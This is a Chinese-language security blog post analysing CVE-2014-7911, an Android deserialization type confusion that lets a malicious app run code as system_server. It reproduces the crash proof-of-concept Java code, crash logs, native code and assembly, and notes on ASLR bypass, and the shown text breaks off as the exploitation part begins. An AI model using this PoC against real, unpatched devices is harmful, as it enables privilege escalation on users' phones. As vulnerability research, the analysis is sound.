<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>CVE-2014-7911安卓序列化漏洞分析 | MS509 Team</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/7.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">CVE-2014-7911安卓序列化漏洞分析</h1><a id="logo" href="/.">MS509 Team</a><p class="description">Mission Studio</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">CVE-2014-7911安卓序列化漏洞分析</h1><div class="post-meta">May 25, 2015<span> | </span><span class="category"><a href="/categories/移动安全/">移动安全</a><a href="/categories/移动安全/二进制安全/">二进制安全</a></span></div><div class="clear"><div id="toc" class="toc-article"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#第一部分-漏洞分析详解"><span class="toc-number">1.</span> <span class="toc-text">第一部分 漏洞分析详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-简介"><span class="toc-number">1.1.</span> <span class="toc-text">0x00 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-漏洞分析"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Java层分析："><span class="toc-number">1.2.1.</span> <span class="toc-text">Java层分析：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#汇编代码分析："><span class="toc-number">1.2.2.</span> <span class="toc-text">汇编代码分析：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03漏洞利用"><span class="toc-number">1.3.</span> <span class="toc-text">0x03漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考文献"><span class="toc-number">1.4.</span> <span class="toc-text">参考文献</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第二部分-漏洞利用详解"><span class="toc-number">2.</span> <span class="toc-text">第二部分 漏洞利用详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-回顾"><span class="toc-number">2.1.</span> <span class="toc-text">0x00 回顾</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-Dalvik-heap-Spray"><span class="toc-number">2.2.</span> <span class="toc-text">0x01 Dalvik-heap Spray</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-ROP-Chain"><span class="toc-number">2.3.</span> <span class="toc-text">0x02 ROP Chain</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Gadget1"><span class="toc-number">2.3.1.</span> <span class="toc-text">Gadget1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Gadget2"><span class="toc-number">2.3.2.</span> <span class="toc-text">Gadget2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Gadget3"><span class="toc-number">2.3.3.</span> <span class="toc-text">Gadget3</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-ASLR"><span class="toc-number">2.4.</span> <span class="toc-text">0x03 ASLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-修复"><span class="toc-number">2.5.</span> <span class="toc-text">0x04 修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">2.6.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></div></div><div class="post-content"><h2 id="第一部分-漏洞分析详解"><a href="#第一部分-漏洞分析详解" class="headerlink" title="第一部分 漏洞分析详解"></a>第一部分 漏洞分析详解</h2><h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h3><p>CVE-2014-7911是由Jann Horn发现的一个有关安卓的提权漏洞，该漏洞允许恶意应用从普通应用权限提权到system用户执行命令，漏洞信息与POC见[1]。漏洞的成因源于在安卓系统（&lt;5.0）中，java.io.ObjectInputStream并未校验输入的java对象是否是实际可序列化的。攻击者因此可以构建一个不可序列化的java对象实例，恶意构建其成员变量，当该对象实例被ObjectInputStream反序列化时，将发生类型混淆，对象的Field被视为由本地代码处理的指针，使攻击者获得控制权。</p>
<h3 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p>在Jann Horm给出的漏洞信息与POC中[1]，向system_server传入的是不可序列化的android.os.BinderProxy对象实例，其成员变量在反序列化时发生类型混淆，由于BinderProxy的finalize方法包含本地代码，于是在本地代码执行时将成员变量强制转换为指针，注意到成员变量是攻击者可控的，也就意味着攻击者可以控制该指针，使其指向攻击者可控的地址空间，最终获得在system_server（uid=1000）中执行代码的权限。下面主要结合POC对漏洞进行详细分析，由于笔者之前对相关的Java序列化、Android binder跨进程通信和native代码都不太熟悉，主要根据参考文献进行翻译、整理和理解，不当之处，还请读者海涵。</p>
<h4 id="Java层分析："><a href="#Java层分析：" class="headerlink" title="Java层分析："></a>Java层分析：</h4><p>第一步，构建一可序列化的恶意对象 </p>
<p>创建AAdroid.os.BinderProxy对象，并将其放入Bundle数据中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Bundle b = new Bundle();</div><div class="line">AAdroid.os.BinderProxy evilProxy = new AAdroid.os.BinderProxy();</div><div class="line">b.putSerializable(&quot;eatthis&quot;, evilProxy);</div></pre></td></tr></table></figure>
<p>注意AAdroid.os.BinderProxy是可序列化的，其成员变量mOrgue就是随后用于改变程序执行流程的指针。随后该可序列化的AAdroid.os.BinderProxy将在传入system_server之间修改为不可序列化的Android.os.BinderProxy对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">public class BinderProxy implements Serializable &#123;</div><div class="line">    private static final long serialVersionUID = 0;</div><div class="line">   //public long mObject = 0x1337beef;</div><div class="line">   //public long mOrgue = 0x1337beef;</div><div class="line">   //注意：此处要根据待测的Android版本号设置，在我们待测试的Android 4.4.4中，BinderProxy的这两个Field为private int，这样才能保证POC访问的地址为我们设置的值0x1337beef</div><div class="line">   private int mObject = 0x1337beef;</div><div class="line">   private int mOrgue = 0x1337beef;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>第二步，准备传入system_server的数据</p>
<p>主要通过一系列java的反射机制，获得android.os.IUserManager.Stub,andrioid.os.IUserManager.Stub.Proxy的Class对象，最终获得跨进程调用system_server的IBinder接口——mRemote，以及调用UserManager.setApplicationRestriction函数的code——TRANSACTION_setApplicationRestriction，为与system_server的跨进程Binder通信作准备。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">Class clIUserManager = Class.forName(&quot;android.os.IUserManager&quot;);</div><div class="line">            Class[] umSubclasses = clIUserManager.getDeclaredClasses();</div><div class="line">            System.out.println(umSubclasses.length+&quot; inner classes found&quot;);</div><div class="line">            Class clStub = null;</div><div class="line">            for (Class c: umSubclasses) &#123;</div><div class="line">                //it&apos;s android.os.IUserManager.Stub</div><div class="line">                System.out.println(&quot;inner class: &quot;+c.getCanonicalName());</div><div class="line">                if (c.getCanonicalName().equals(&quot;android.os.IUserManager.Stub&quot;)) &#123;</div><div class="line">                    clStub = c;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            Field fTRANSACTION_setApplicationRestrictions =</div><div class="line">                    clStub.getDeclaredField(&quot;TRANSACTION_setApplicationRestrictions&quot;);</div><div class="line">            fTRANSACTION_setApplicationRestrictions.setAccessible(true);</div><div class="line">            TRANSACTION_setApplicationRestrictions =</div><div class="line">                    fTRANSACTION_setApplicationRestrictions.getInt(null);</div><div class="line"></div><div class="line">            UserManager um = (UserManager) ctx.getSystemService(Context.USER_SERVICE);</div><div class="line">            Field fService = UserManager.class.getDeclaredField(&quot;mService&quot;);</div><div class="line">            fService.setAccessible(true);</div><div class="line">            Object proxy = fService.get(um);</div><div class="line"></div><div class="line">            Class[] stSubclasses = clStub.getDeclaredClasses();</div><div class="line">            System.out.println(stSubclasses.length+&quot; inner classes found&quot;);</div><div class="line">            clProxy = null;</div><div class="line">            for (Class c: stSubclasses) &#123;</div><div class="line">                //it&apos;s android.os.IUserManager.Stub.Proxy</div><div class="line">                System.out.println(&quot;inner class: &quot;+c.getCanonicalName());</div><div class="line">                if (c.getCanonicalName().equals(&quot;android.os.IUserManager.Stub.Proxy&quot;)) &#123;</div><div class="line">                    clProxy = c;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            Field fRemote = clProxy.getDeclaredField(&quot;mRemote&quot;);</div><div class="line">            fRemote.setAccessible(true);</div><div class="line">            mRemote = (IBinder) fRemote.get(proxy);//获得跨进程调用system_server的IBinder接口</div><div class="line"></div><div class="line">            UserHandle me = android.os.Process.myUserHandle();</div><div class="line">            setApplicationRestrictions(ctx.getPackageName(), b, me.hashCode());</div></pre></td></tr></table></figure>
<p>第三步，向system_server传入不可序列化的Bundle参数</p>
<p>接下来，调用setApplicationRestrictions这个函数，并传入了之前打包evilproxy的Bundle数据作为参数。将该函数与Android源码中的setApplicationRestrication函数[6]对比，主要的区别在于将传入的Bundle数据进行了修改，将之前可序列化的AAdroid.os.BinderProxy对象修改为了不可序列化的Android.os.BinderProxy对象，这样就将不可序列化的Bundles数据，通过Binder跨进程调用，传入system_server的Android.os.UserManager.setApplicationRestrictions方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">public void setApplicationRestrictions(java.lang.String packageName, android.os.Bundle restrictions, int</div><div class="line">            userHandle) throws android.os.RemoteException</div><div class="line">    &#123;</div><div class="line">        android.os.Parcel _data = android.os.Parcel.obtain();</div><div class="line">        android.os.Parcel _reply = android.os.Parcel.obtain();</div><div class="line">        try &#123;</div><div class="line">            _data.writeInterfaceToken(DESCRIPTOR);</div><div class="line">            _data.writeString(packageName);</div><div class="line">            _data.writeInt(1);</div><div class="line">            restrictions.writeToParcel(_data, 0);</div><div class="line">            _data.writeInt(userHandle);</div><div class="line">            </div><div class="line">            //修改AAdroid.os.BinderProxy为Android.os.BinderProxy</div><div class="line"></div><div class="line">            byte[] data = _data.marshall();</div><div class="line">            for (int i=0; true; i++) &#123;</div><div class="line">                if (data[i] == &apos;A&apos; &amp;&amp; data[i+1] == &apos;A&apos; &amp;&amp; data[i+2] == &apos;d&apos; &amp;&amp; data[i+3] == &apos;r&apos;) &#123;</div><div class="line">                    data[i] = &apos;a&apos;;</div><div class="line">                    data[i+1] = &apos;n&apos;;</div><div class="line">                    break;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            _data.recycle();</div><div class="line">            _data = Parcel.obtain();</div><div class="line">            _data.unmarshall(data, 0, data.length);</div><div class="line">            /**</div><div class="line">            通过Binder机制跨进程调用Android.os.UserManager.setApplicationRestrictions方法，</div><div class="line">            向system_server传入的是实际不可序列化的Android.os.BinderProxy对象</div><div class="line">            */</div><div class="line">            mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0);</div><div class="line">            _reply.readException();</div><div class="line">        &#125;</div><div class="line">        finally &#123;</div><div class="line">            _reply.recycle();</div><div class="line">            _data.recycle();</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>安装POC，启动Activity后将其最小化，触发GC，引起Android系统重启，从Logcat日志中可以看到，system_server执行到了之前设置的BinderProxy对象的0x1337beef这个值，访问了不该访问的内存，导致异常。错误信号、寄存器快照和调用栈如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">05-14 18:30:55.974: I/DEBUG(3695): Build fingerprint: &apos;google/hammerhead/hammerhead:4.4.4/KTU84P/1227136:user/release-keys&apos;</div><div class="line">05-14 18:30:55.974: I/DEBUG(3695): Revision: &apos;11&apos;</div><div class="line">05-14 18:30:55.974: I/DEBUG(3695): pid: 1552, tid: 1560, name: FinalizerDaemon  &gt;&gt;&gt; system_server &lt;&lt;&lt;</div><div class="line">05-14 18:30:55.974: I/DEBUG(3695): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 1337bef3</div><div class="line">05-14 18:30:56.064: I/DEBUG(3695):     r0 1337beef  r1 401b89d9  r2 746fdad8  r3 6d4fbdc4</div><div class="line">05-14 18:30:56.064: I/DEBUG(3695):     r4 401b89d9  r5 1337beef  r6 713e3f68  r7 1337beef</div><div class="line">05-14 18:30:56.064: I/DEBUG(3695):     r8 1337beef  r9 74709f68  sl 746fdae8  fp 74aacb24</div><div class="line">05-14 18:30:56.064: I/DEBUG(3695):     ip 401f08a4  sp 74aacae8  lr 401b7981  pc 40105176  cpsr 200d0030</div><div class="line">...</div><div class="line">I/DEBUG   (  241): backtrace:</div><div class="line">I/DEBUG   (  241):     #00  pc 0000d176  /system/lib/libutils.so (android::RefBase::decStrong(void const*) const+3)</div><div class="line">I/DEBUG   (  241):     #01  pc 0007097d  /system/lib/libandroid_runtime.so</div><div class="line">I/DEBUG   (  241):     #02  pc 0001dbcc  /system/lib/libdvm.so (dvmPlatformInvoke+112)</div><div class="line">I/DEBUG   (  241):     #03  pc 0004e123  /system/lib/libdvm.so (dvmCallJNIMethod(unsigned int const*, JValue*, Method const*, Thread*)+398)</div><div class="line">I/DEBUG   (  241):     #04  pc 00026fe0  /system/lib/libdvm.so</div><div class="line">I/DEBUG   (  241):     #05  pc 0002dfa0  /system/lib/libdvm.so (dvmMterpStd(Thread*)+76)</div><div class="line">I/DEBUG   (  241):     #06  pc 0002b638  /system/lib/libdvm.so (dvmInterpret(Thread*, Method const*, JValue*)+184)</div><div class="line">I/DEBUG   (  241):     #07  pc 0006057d  /system/lib/libdvm.so (dvmCallMethodV(Thread*, Method const*, Object*, bool, JValue*, std::__va_list)+336)</div><div class="line">I/DEBUG   (  241):     #08  pc 000605a1  /system/lib/libdvm.so (dvmCallMethod(Thread*, Method const*, Object*, JValue*, ...)+20)</div><div class="line">I/DEBUG   (  241):     #09  pc 00055287  /system/lib/libdvm.so</div><div class="line">I/DEBUG   (  241):     #10  pc 0000d170  /system/lib/libc.so (__thread_entry+72)</div><div class="line">I/DEBUG   (  241):     #11  pc 0000d308  /system/lib/libc.so (pthread_create+240)</div></pre></td></tr></table></figure>
<p>####Native层分析:</p>
<p>假如BinderProxy可以被序列化，那么在反序列化时，其field引用的对象也会被反序列化；但在POC中ObjectInputStream反序列化的BinderProxy对象实例不可序列化，这样在ObjectInputStream反序列化BinderProxy对象时，发生了类型混淆（type confusion），其field被当做随后由Native代码处理的指针。这个filed就是之前设置的0x1337beef，具体而言，就是mOrgue这个变量。</p>
<p>android.os.BinderProxy 的finalize方法调用native代码，将mOrgue处理为指针.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">protected void finalize() throws Throwable &#123;</div><div class="line">    destroy();</div><div class="line">    super.finalize();</div><div class="line">    return;</div><div class="line">    Exception exception;</div><div class="line">    exception;</div><div class="line">    super.finalize();</div><div class="line">    throw exception;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>其中，destroy为native方法</p>
<pre><code>private final native void destroy();
</code></pre><p>cpp代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">static void android_os_BinderProxy_destroy(JNIEnv* env, jobject obj)</div><div class="line">&#123;</div><div class="line">    IBinder* b = (IBinder*)</div><div class="line">            env-&gt;GetIntField(obj, gBinderProxyOffsets.mObject);</div><div class="line">    DeathRecipientList* drl = (DeathRecipientList*)</div><div class="line">            env-&gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);</div><div class="line">    LOGDEATH(&quot;Destroying BinderProxy %p: binder=%p drl=%p\n&quot;, obj, b, drl);</div><div class="line">    env-&gt;SetIntField(obj, gBinderProxyOffsets.mObject, 0);</div><div class="line">    env-&gt;SetIntField(obj, gBinderProxyOffsets.mOrgue, 0);</div><div class="line">    drl-&gt;decStrong((void*)javaObjectForIBinder);</div><div class="line">    b-&gt;decStrong((void*)javaObjectForIBinder);</div><div class="line">    IPCThreadState::self()-&gt;flushCommands();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>最终native代码调用上述decStrong方法，从</p>
<pre><code>DeathRecipientList* drl = (DeathRecipientList*)
        env-&gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);
</code></pre><p>这一行可以看出，drl就是mOrgue，可以被攻击者控制。<br>所以，drl-&gt;decStrong方法调用使用的this指针可由攻击者控制。</p>
<p>再看一下RefBase类中的decStrong方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">void RefBase::decStrong(const void* id) const</div><div class="line">&#123;</div><div class="line">    weakref_impl* const refs = mRefs;</div><div class="line">    refs-&gt;removeStrongRef(id);</div><div class="line">    const int32_t c = android_atomic_dec(&amp;refs-&gt;mStrong);</div><div class="line">#if PRINT_REFS</div><div class="line">    ALOGD(&quot;decStrong of %p from %p: cnt=%d\n&quot;, this, id, c);</div><div class="line">#endif</div><div class="line">    ALOG_ASSERT(c &gt;= 1, &quot;decStrong() called on %p too many times&quot;, refs);</div><div class="line">    if (c == 1) &#123;</div><div class="line">        refs-&gt;mBase-&gt;onLastStrongRef(id);</div><div class="line">        if ((refs-&gt;mFlags&amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) &#123;</div><div class="line">            delete this;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    refs-&gt;decWeak(id);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>注意上述refs-&gt;mBase-&gt;onLastStrongRef(id)最终导致代码执行。</p>
<h4 id="汇编代码分析："><a href="#汇编代码分析：" class="headerlink" title="汇编代码分析："></a>汇编代码分析：</h4><p>下面看一下发生异常时最后调用的RefBase:decStrong的汇编代码。将libutils.so拖入IDA Pro，查看Android::RefBase::decStrong函数。分析时需要牢记的是，攻击者能够控制r0(this指针)</p>
<p><img src="/2015/05/25/cve-2014-7911/Decstrong.png" alt="image"></p>
<p>首先对r0的使用，是在decStrong的前下面三行代码之中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">weakref_impl* const refs = mRefs;</div><div class="line">refs-&gt;removeStrongRef(id);</div><div class="line">const int32_t c = android_atomic_dec(&amp;refs-&gt;mStrong);</div></pre></td></tr></table></figure>
<p>对应的汇编代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ldr     r4, [r0, #4]   # r0为this指针，r4为mRefs</div><div class="line">mov     r6, r1</div><div class="line">mov     r0, r4</div><div class="line">blx     &lt;android_atomic_dec ()&gt;</div></pre></td></tr></table></figure>
<p>首先，mRefs被加载到r4。（r0是drl的this指针，mRefs是虚函数表之后的第一个私有变量，因此mRefs为r0+4所指向的内容）</p>
<p>然后，android_atomic_dec函数被调用，传入参数&amp;refs-&gt;mStrong.</p>
<pre><code>const int32_t c = android_atomic_dec(&amp;refs-&gt;mStrong);
</code></pre><p>这被翻译为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mov     r0, r4	# r4指向mStrong，r0指向mStrong</div><div class="line">blx     &lt;android_atomic_dec ()&gt;</div></pre></td></tr></table></figure>
<p>作为函数参数，上述r0就是&amp;refs-&gt;mStrong。注意，mStrong是refs（类weakref_impl）的第一个成员变量，由于weakref_impl没有虚函数，所以没有虚函数表，因此mStrong就是r4所指向的内容。</p>
<p>另外，refs-&gt;removeStrongRef(id);这一行并没有出现在汇编代码中，因为这个函数为空实现，编译器进行了优化。如下所示。</p>
<pre><code>void removeStrongRef(const void* /*id*/) { }
</code></pre><p>在调用android_atomic_dec后，出现的是以下代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if (c == 1) &#123;</div><div class="line">	refs-&gt;mBase-&gt;onLastStrongRef(id);</div></pre></td></tr></table></figure>
<p>对应的汇编代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">cmp     r0, #1          # r0 = refs-&gt;mStrong</div><div class="line">bne.n   d1ea</div><div class="line">ldr     r0, [r4, #8]    # r4 = &amp;refs-&gt;mStrong</div><div class="line">mov     r1, r6</div><div class="line">ldr     r3, [r0, #0] </div><div class="line">ldr     r2, [r3, #12]</div><div class="line">blx     r2</div></pre></td></tr></table></figure>
<p>注意，android_atomic_dec函数执行强引用计数减1，返回的是执行减1操作之前所指定的内存地址存放的值。为了调用refs-&gt;mBase-&gt;onLastStrongRef(id)(即：blx r2)，攻击者需要使refs-&gt;mStrong为1.</p>
<p>至此，可以看出攻击者为了实现代码执行，需要满足如下约束条件：</p>
<ol>
<li>drl(就是mOrgue，第一个可控的指针，在进入decStrong函数时的r0)必须指向可读的内存区域;</li>
<li>refs-&gt;mStrong必须为1;</li>
<li>refs-&gt;mBase-&gt;onLastStrongRef(id)需要执行成功。并最终指向可执行的内存区域。即满足</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">if(*(*(mOrgue+4))==1)&#123;</div><div class="line">    refs = *(mOrgue+4)</div><div class="line">    r2 = *(*(*(refs+8))+12)</div><div class="line">    blx r2  -----&gt;获取控制权</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>除此以外，攻击者还必须克服Android中的漏洞缓解技术——ASLR和DEP。</p>
<h3 id="0x03漏洞利用"><a href="#0x03漏洞利用" class="headerlink" title="0x03漏洞利用"></a>0x03漏洞利用</h3><p>为了成功获得任意代码执行，攻击者可以使用堆喷射、堆栈转移（stack pivoting）和ROP等技术。受限于笔者目前水平，这里就不再分析了，具体分析和retme大牛的POC可参见[2,3,4]。</p>
<p>值得注意的是，尽管Android采用了ASLR机制，但为了获得正确的地址，可以基于这样一个事实：system_server和攻击者app都是从同一个进程-Zygote fork而来，具有相同的基址，攻击者通过分析自己进程的map文件（位于/proc/\<pid\>/maps）就可以知道system_server以及所加载模块的内存布局。</pid\></p>
<p>另外一个有趣的话题是，洞主Jann Horn对PAN的分析进行了评论[2]，认为不需要复杂的ROP gadgets就可以实现命令执行，而PAN对此进行了澄清。这从侧面反映了漏洞利用技术也是一门大的学问，有时即使漏洞发现者也未必能够真正理解漏洞利用的挑战。</p>
<p>最后Jann Horn谈到了发现此漏洞的灵感[5]，源于他在大学时听到的一次讲座，涉及到某个PHP web应用在反序列化攻击者输入数据时出现的漏洞，这使他思考其他应用是否也有类似的问题。他知道Java的反序列化由ObjectInputStream处理不可信的输入数据，android也许忘了进行检查。是的，漏洞就在那里。</p>
<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p>[1]<a href="http://seclists.org/fulldisclosure/2014/Nov/51" target="_blank" rel="external">http://seclists.org/fulldisclosure/2014/Nov/51</a></p>
<p>[2]<a href="http://researchcenter.paloaltonetworks.com/2015/01/cve-2014-7911-deep-dive-analysis-android-system-service-vulnerability-exploitation" target="_blank" rel="external">http://researchcenter.paloaltonetworks.com/2015/01/cve-2014-7911-deep-dive-analysis-android-system-service-vulnerability-exploitation</a></p>
<p>[3]<a href="https://github.com/retme7/CVE-2014-7911_poc" target="_blank" rel="external">https://github.com/retme7/CVE-2014-7911_poc</a></p>
<p>[4]<a href="https://github.com/retme7/My-Slides/blob/master/xKungfooSH%40retme.pdf" target="_blank" rel="external">https://github.com/retme7/My-Slides/blob/master/xKungfooSH%40retme.pdf</a> </p>
<p>[5]<a href="https://www.reddit.com/r/netsec/comments/2mr9cz/cve20147911_android_50_privilege_escalation_using/" target="_blank" rel="external">https://www.reddit.com/r/netsec/comments/2mr9cz/cve20147911_android_50_privilege_escalation_using/</a></p>
<p>[6]<a href="http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/4.4_r1/android/os/IUserManager.java#IUserManager.Stub.Proxy.setApplicationRestrictions%28java.lang.String%2Candroid.os.Bundle%2Cint%29" target="_blank" rel="external">http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/4.4_r1/android/os/IUserManager.java#IUserManager.Stub.Proxy.setApplicationRestrictions%28java.lang.String%2Candroid.os.Bundle%2Cint%29</a></p>
<p>—-2015.10.20更新—–</p>
<h2 id="第二部分-漏洞利用详解"><a href="#第二部分-漏洞利用详解" class="headerlink" title="第二部分 漏洞利用详解"></a>第二部分 漏洞利用详解</h2><h3 id="0x00-回顾"><a href="#0x00-回顾" class="headerlink" title="0x00 回顾"></a>0x00 回顾</h3><p>CVE-2014-7911是一个非常值得学习的漏洞，其漏洞成因和漏洞利用涉及java序列化、安卓binder IPC通信、ROP、Stack Pivot、heap Spray及多方面的知识，<a href="http://drops.wooyun.org/mobile/6082" target="_blank" rel="external">http://drops.wooyun.org/mobile/6082</a>对漏洞成因及Crash POC进行了分析。本篇结合retme、secauo等大牛们的已有exp，站在大牛们的肩膀上，续写漏洞利用部分，最终目标是利用这个漏洞以system权限执行代码。</p>
<p>首先回顾一下。前面提到，利用java反射和Binder进程间通信机制，向system_server传入一不可序列化的恶意对象，由于java.io.ObjectInputStream并未校验该输入的对象实例是否是实际可序列化的，因此当该对象实例被ObjectInputStream反序列化时，将发生类型混淆，对象的Field被视为由本地代码处理的指针，使攻击者获得控制权。如下，</p>
